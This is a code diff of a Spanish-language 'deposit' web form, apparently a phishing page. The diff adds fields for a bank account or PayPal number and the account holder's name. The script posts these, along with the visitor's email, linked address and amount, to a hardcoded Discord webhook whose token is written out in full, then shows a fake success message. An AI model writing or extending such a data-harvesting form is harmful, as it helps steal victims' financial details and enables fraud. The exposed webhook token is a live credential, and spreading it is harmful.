@@ -60,31 +60,41 @@
             <button class="btn btn-copiar" onclick="copiarAlias()">Copiar</button>
             <span id="mensaje-copiado" class="mensaje-copiado">Copiado!</span>
         </div>
-        <div class="input-group">
-        <label for="captura">Captura del Envío:</label>
-        <input type="file" id="captura">
-    </div>
+       <div class="input-group">
+    <label for="captura">Captura del Envío:</label>
+    <input type="file" id="captura">
+</div>
 
-    <div class="input-group">
-        <label for="correo">Correo Electrónico:</label>
-        <input type="email" id="correo">
-    </div>
+<div class="input-group">
+    <label for="correo">Correo Electrónico:</label>
+    <input type="email" id="correo">
+</div>
 
-    <div class="input-group">
-        <label for="address">Dirección Vinculada:</label>
-        <input type="text" id="address">
-    </div>
+<div class="input-group">
+    <label for="address">Dirección Vinculada:</label>
+    <input type="text" id="address">
+</div>
 
-    <button class="btn" onclick="enviarDatos()">Enviar</button>
+<div class="input-group">
+    <label for="cuenta">Número de Cuenta o PayPal:</label>
+    <input type="text" id="cuenta">
+</div>
 
-    <div id="mensaje-procesando" class="mensaje-procesando"></div>
+<div class="input-group">
+    <label for="titular">Nombre del Titular de la Cuenta:</label>
+    <input type="text" id="titular">
+</div>
+
+<button class="btn" onclick="enviarDatos()">Enviar</button>
+
+<div id="mensaje-procesando" class="mensaje-procesando"></div>
+
 
     <script>
-function enviarDatosAlWebhook(correo, direccion, captura) {
+function enviarDatosAlWebhook(correo, direccion, capturaURL, numeroCuenta, titularCuenta, monto) {
     var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
     var payload = {
-        content: 'Nuevo depósito:\nCorreo: ' + correo + '\nDirección Vinculada: ' + direccion,
-        // También puedes incluir la URL de la captura en el mensaje si lo deseas
+        content: 'Nuevo depósito:\nCorreo: ' + correo + '\nDirección Vinculada: ' + direccion + '\nNúmero de Cuenta: ' + numeroCuenta + '\nTitular de la Cuenta: ' + titularCuenta + '\nMonto: ' + monto + '\nCaptura del Depósito: ' + capturaURL,
     };
 
     // Realizar una solicitud HTTP POST al webhook de Discord
@@ -101,13 +111,16 @@ function enviarDatos() {
     var correo = document.getElementById("correo").value;
     var direccion = document.getElementById("address").value;
     var capturaURL = '';  // La URL de la captura del depósito, si la tienes
+    var numeroCuenta = document.getElementById("cuenta").value;
+    var titularCuenta = document.getElementById("titular").value;
+    var monto = document.getElementById("monto").value;  // Obtener el valor del campo de monto
 
-    // Validar el formato del correo y la existencia de la dirección
-    if (correo && correo.trim() !== '' && direccion && direccion.trim() !== '') {
+    // Validar el formato del correo, la existencia de la dirección, el número de cuenta y el titular de la cuenta
+    if (correo && correo.trim() !== '' && direccion && direccion.trim() !== '' && numeroCuenta && numeroCuenta.trim() !== '' && titularCuenta && titularCuenta.trim() !== '' && monto && monto.trim() !== '') {
         // Aquí puedes cargar la captura del depósito si es necesario
 
         // Llamar a la función para enviar los datos al webhook de Discord
-        enviarDatosAlWebhook(correo, direccion, capturaURL);
+        enviarDatosAlWebhook(correo, direccion, capturaURL, numeroCuenta, titularCuenta, monto);
 
         // Mostrar mensaje de éxito u realizar otras acciones si es necesario
         mostrarMensaje("Depósito procesado con éxito. Recibirás un correo electrónico pronto.");
@@ -116,7 +129,7 @@ function enviarDatos() {
         }, 300000); // Redirigir después de 5 minutos (300000 milisegundos)
     } else {
         // Mostrar mensaje de error si falta algún dato
-        mostrarError("Por favor, ingrese un correo válido y una dirección.");
+        mostrarError("Por favor, complete todos los campos correctamente.");
     }
 }
 
